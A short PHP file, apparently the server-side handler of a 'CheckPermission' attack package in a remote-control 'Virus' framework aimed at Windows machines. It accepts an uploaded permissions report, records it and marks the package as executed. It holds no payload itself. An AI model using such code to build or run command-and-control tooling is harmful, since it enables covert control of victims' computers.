<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission;
use Kelvinho\Virus\Singleton\Header;

/** @var CheckPermission $this */

if (!$this->requestData->hasFile("permFile")) Header::ok();

$this->setPermissions($this->requestData->file("permFile"));
$this->setExecuted();
$this->saveState();
